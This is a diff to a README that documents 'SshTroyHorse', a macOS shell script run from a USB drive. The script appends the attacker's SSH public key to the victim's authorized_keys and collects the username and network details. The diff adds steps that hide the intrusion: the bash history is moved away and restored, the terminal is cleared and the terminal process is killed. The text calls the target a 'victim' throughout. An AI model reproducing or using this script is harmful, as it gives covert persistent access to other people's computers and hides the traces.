@@ -23,6 +23,7 @@ SshTroyHorse (OS X)
 `#! /bin/sh`
 Declares a bash script.
 
+`mv ~/.bash_history /Volumes/keyInstaller/` momentarily copies the bash history in **/Volumes/keyInstaller/**, so that the victim won't notice anything
 `open /System/Library/PreferencePanes/SharingPref.prefPane/` opens the sharing preferences page.
 
 `cat /Volumes/keyInstaller/id_rsa.pub >> ~/.ssh/authorized_keys` copies your public key in the target authorized keys.
@@ -31,9 +32,17 @@ Declares a bash script.
 
 `whoami >> /Volumes/keyInstaller/whoamis.txt` saves the active username in **whoamis.txt**
 
-`hostname >> /Volumes/keyInstaller/hostnames.txt` saves the hostname in **hostnames.txt**
+`echo "----------------------------" >> /Volumes/keyInstaller/hostnames.txt` separes different attacks in **hostnames.txt**
+
+`ifconfig >> /Volumes/keyInstaller/hostnames.txt` sends to **hostnames.txt** network informations about victim's computer
 
 `toeject=$(df -h | grep /Volumes/keyInstaller) && toeject=${toeject:0:12}` **toeject** contains the string with the name of the device.
+
+`mv /Volumes/keyInstaller/.bash_history ~/` restores the **.bash_profile** in the victim's home
+
+`clear` clears the terminal
+
+`kill -9 $(ps -p $(ps -p $PPID -o ppid=) -o ppid=)` kills the terminal itself
 
 `diskutil unmount $toeject` unmounts the drive to eject
 
